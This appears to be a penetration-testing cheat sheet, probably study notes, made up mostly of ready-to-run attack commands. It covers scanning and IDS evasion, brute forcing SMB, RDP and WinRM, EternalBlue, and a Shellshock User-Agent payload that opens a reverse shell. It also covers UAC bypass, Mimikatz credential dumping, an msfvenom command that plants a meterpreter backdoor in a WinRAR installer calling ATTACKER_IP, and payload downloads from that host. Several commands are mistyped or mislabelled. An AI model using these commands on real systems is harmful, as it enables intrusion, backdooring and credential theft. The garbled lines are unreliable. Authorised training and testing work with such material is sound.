# Enumeration
Do not forget that enumeration is the key!
## Nmap 
1. Host Discovery
```
nmap <Target_network>/24 -sn -oA Alive_hosts
```
* Another way for host discovery
```
nmap -sn -PS 21,22,25,80,445,3389,8080 -PU 137,138 -T4 <TARGET_IP>
```
* Scanning hosts in a file
```
nmap -iL <SCOP_FILE>
```
2. Servie detection
```
nmap <TARGET_IP> -sV -p- -Pn -n -T5 ---min-rate=10000 -oA services
```
* You can list nmap scripts for a specific service:
```
ls -al /usr/share/nmap/scripts | grep -e <SERVICE>
```
3. Nmap scripts scan
```
nmap <Target_IP> -sC -p- -Pn -n -T5 ---min-rate=10000 
```
4. Aggresive scan
```
nmap <TARGET_IP> -Pn -n -T5 ---min-rate=10000 -A
```
5. Nmap scripts for a specific service
```
nmap <TARGET_IP> --scipt=<Service_name>* -p<Service_port> -Pn -n -T5 ---min-rate=10000
```
* NOTE: there are catagories for nmap scripts. For more info check https://nmap.org/book/nse-usage.html
6. UDP scan (top 100 ports)
```
nmap -F -sU --top-ports=100 <TARGET_IP>
```
* Since UPD takes longer to scan, scan the top 100
7. Firewall & IDS/IPS evasion scans
```
nmap <TARGET_IP> -Pn -n -p- -sA 
```
8. IP spoofing scan
```
nmap -S <SPOOFED_IP> <TARGET_IP> -p- -Pn -n -sA
```
9. Different source port scan
```
sudo nmap -g <PORT_NUMBER> <TARGET_IP> -p- -Pn -n -sS
```
10. Scanning using a taget gateway
```
nmap -D <TAGET_GATEWAY>, ME <TARGET> -Pn -p- -n
```
11. Minimizing MTU size
```
nmap -f mtu <SIZE> -p- -Pn -n <TARGET_IP>
```
12. Banner grabbing using Netcat
```
nc <TARGET_IP> <PORT>
```
## Web Enumeration 
* Subdomain enumeration
1. Using gobuster
```
gobuster dir -u http://<IP>/ -w WORDLIST
```
2. Using assetfinder
    
```
assetfinder <DOMAIN> >> total_subdomains.txt
```
```
assetfinder --subs-only <DOMAIN> >> subdmoains_only.txt
```
4. Using sublist3r
```
sublist3r -d <DOMAIN> -t 100
```
5. Discover web technology using whatweb
```
whatweb <DOMAIN>
```
6. Nikto scan
```
nikto -h <DOMAIN> 
```
7. Httprobe to detemine alive subdomains 
```
cat subdomains.txt | httprobe >> alive_subs.txt
```
8. Take a screenshot of a website
```
gowitness single <DOMAIN>
```
# Footprinting service
## SMB
1. Using nmap scripts to enumerate SMB
```
nmap -sV -p 445,139 -Pn -n --script=smb* <TARGET_IP>
```
2. SMBmap 
```
smbmap -H <TARGET_IP> -u <USERNAME> -p <PASSWORD>
```
3. Enumerating a specific SMB share using SMBmap
```
smbmap -H <TARGET_IP> -u <USERNAME> -p <PASSWORD> -r ‘SHARE_NAME$/’
```
4. Uploading file using SMBmap
```
smbmap -H <TARGET_IP> -u <USERNAME> -p <PASSWORD> --upload '/filename' 'C$/tmp/'
```
5.  Metasploit modules for enumerating SMB
```
auxiliary/scanner/smb/smb_version
axuliliary/scanner/smb/smb_enumshares
```
6. Enumerating SMB shares using smbclient
```
smbclient -L -N //<TARGET_IP>
smbclient -L -N  //<TARGET_IP>/Share_Name
```
7. Connecting to a specific share (You need credentials)
```
smbclient -U <USERNAME> //<TARGET_IP>/Share_Name
```
8. Enumerating SMB shares crackmapexec (Anonymous login)
```
crackmapexec smb <TARGET_IP> --shares -u '' -p ''
```
9. Enumerating SMB using Enum4Linux-ng
* Install the tool
```
git clone https://github.com/cddmp/enum4linux-ng.git
cd enum4linux-ng
pip3 install -r requirements.txt
```
* Run the tool
```
./enum4linux-ng.py <TARGET_IP> -A
```
10. Enumerating domain users, domain names, and more! Using rpcclient **(Login is anonymous)**
```
rpcclient -U "" <TARGET_IP>
```
* Queries that you can run:
*   srvinfo
*   enumdomians
*   querydominfo
*   netshareenumall
*   enumdomuser
* You can read more on https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb/rpcclient-enumeration
## FTP
1. Nmap scripts for nmap
```
nmap -sV -p 21 -Pn -n --script=ftp* <TARGET_IP>
```
2. Banner grabbing using Netcat
```
nc <Target_IP> 21
```
3. Banner grabbing using telnet
```
telnet <Target_IP> 21 
```
4. Ftp anonymous login
```
ftp <Target_IP> 
```
5. Downloading ftp files **(If anonymous login is allowed)**
```
wget -m --no-passive ftp://anonymous:anonymous@IP
```
## SSH
1. Banner grabbing
```
nc <Target_IP> 22
```
2. Nmap scripts
```
nmap -sV -p 22 -Pn -n --script=ssh* <TARGET_IP>
```
3. Connecting to a SSH
```
ssh <USERNAME>@<TARGET_IP>
```
* Using id_rsa key
```
ssh -i id_rsa <USERNAME>@<TARGET_IP>
```
## MySQL
1. Login to MySQL service
```
mysql -h <TARGET_IP> -u <USERNAME> -p <PASSWORD>
```
2. Nmap scripts for MySQL
```
nmap -sV -p 3306 -Pn -n --script=mysql* <TARGET_IP>
```
3. Metasploit modules for MySQL
```
use auxiliary/scanner/mysql/mysql_hashdump
use auxiliary/scanner/mysql/mysql_login
```
## MSSQL
1. Nmap scripts for MSSQL
```
nmap -sV -p 1433 -Pn -n --script=mssql* <TARGET_IP>
```
2. Connecting to MSSQL
```
python3 mssqlclient.py <USERNAME>@<TARGET_IP> -windows-auth
```
## RDP
1. Nmap scripts for RDP
```
nmap -sV -sC Target -p3389 --script rdp*
```
2. Connecting to RDP
```
xfreerdp /u:<USERNAME> /p:"<PASSWORD>" /v:<TARGET_IP>
```
## WinRM
1. WinRM
```
nmap -sV -sC -p5985,5986 <TARGET_IP>
``` 
2. Connecting to WinRM
```
evil-winrm -i Target -u username -p password
```
# System/Host Based Attacks
## 1. Windows
### 1) Microsoft IIS
1. Brute forcing webDAV
```
hydra -L <USERNAME_WORDLIST>  -P <PASSWORD_WORDLIST> <TARGET_IP> http-get /webdav/
```
* After obtaining credentials, you can authenticate with davtest
```
davtest -auth <USERNAME>:<PASSWORD> -url http://<TARGET_IP>/webdav
```
* Uploading payload to the webserver
```
cadaver http://10.10.10.1/webdav
> put payload
```
* Set a listener (Netcat or Metasploit)
```
nc -nvlp <PORT>
```
```
exploit(multi/handler)
```
* Automate the proccess by using Metasploit
```
use exploit(windows/iis/iis_webdav_upload_asp)
```
### 2) SMB 
1. EternalBlue (MS17-010)
* Check whether the system is vulnerable
```
nmap -p 445  —script=smb-vuln-ms17-010 <TARGET_IP>
```
* Exploit the system using
```
exploit(windows/smb/ms17_010_eternalblue)
```
2. Brute forcing SMB
* Method 1
```
hydra -L <USERNAME_WORDLIST> -P <PASSWORD_WORDLIST> <TARGET_IP> smb
```
* Method 2
```
auxiliary(scanner/smb/smb_login)
```
3. Connecting to SMB
* Method 1
```
psexec.py <USERNAME>@<TARGET_IP> cmd.exe
```
* Method 2
```
exploit(windows/smb/psexec)
```
### 3) RDP
1. Brute forcing RDP
```
hydra -L <USERNAME_WORDLIST> -P <PASSWORD_WORDLIST> rdp://<TARGET_IP> 
```
### 4) WinRM
1. Brute forcing WinRM
```
crackmapexec winrm <TARGET_IP> -u <USERNAME> -p <PASSWORD_WORDLIST>
```
2. Connecting to WinRM using evil-winrm
```
evil-winrm.rb -i <TARGET_IP> -u <USERNAME> -p <PASSWORD_WORDLIST>
```
3. Connecting WinRM using Metasploit
```
auxiliary(scanner/winrm/winrm_login)
exploit(windows/winrm/winrm_script_exec)
```
## 2. Linux
### 1) Shellshock
1. Manually exploiting
* Intercept (Using burp suite) and replace the **User Agent** by:
```
() { :; }; echo; echo; /bin/bash -c  'bash -i>&/dev/tcp/LOCAL_HOST/PORT 0>&1’
```
* Open a listener using Netcat
```
nc -nvlp PORT
```
2. Use Metasploit to automate the process
```
exploit(multi/http/apache_mod_cgi_bash_env_exec)
```
# Post exploitation
## 1. Privilege escalation
### 1) Windows 
1. Bypassing UAC using UACMe
* https://github.com/hfiref0x/UACME
* Upload UACMe to the targeted system
* Run the script!
```
.\Akagai64.exe 23 C:\tmp\shell.exe
```
2. Bypassing UAC using access token key
* You must have Metasploit meterpreter session
```
pgrep lsass
migrate to <pid>
load incognito
list_tokens -u
impersonate_token “NT Authority\Administrator"
```
### 2) Linux
1. SUID binaries
* Check https://gtfobins.github.io/
* To find SUID
```
find . -exec /bin/sh -p \; -quit
```
## Credential dumping
### 1) Windows
1. Mimikatz (Transfer Mimikatz.exe to the target system)
```
sekurlsa::logonpasswords
lsadump::sam
```
2. Kiwi module (Metasploit)
```
pgrep lsass
migrate <pid>
load kiwi
hashdump
```
### 2) Linux
* /etc/shadow has all passwords, copy them to a file and crack them!
```
hashcat -m <HASH_TYPE> -a 0 hashes.txt <WORDLIST>
```
# Random stuff
1. Creating a payload and injecting it into Winrar.exe
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -i 10 -e shakata_ga_nia -f exe -x ~/Downloads/winrar602.exe > ~/Desktop/winrar32.exe
```
2. Transferring files
* Python HTTP server
```
python -m SimpleHTTPServer 80
```
* To Windows
```
certutil -urlcache -f http://ATTACKER_IP/payload.exe payload.exe
```
* To Linux
```
wget http://ATTACKER_IP/payload.exe 
```
# Useful recourse
## Enumeration scripts:
### 1. Windows:
1. WinPEAS: https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS
2. Seatbelt: https://github.com/GhostPack/Seatbelt
3. JAWS: https://github.com/411Hall/JAWS
### 2. Linux:
1. LinPEAS: https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS
2. LinEnum: https://github.com/rebootuser/LinEnum
3. Linuxprivchecker: https://github.com/sleventyeleven/linuxprivchecker

















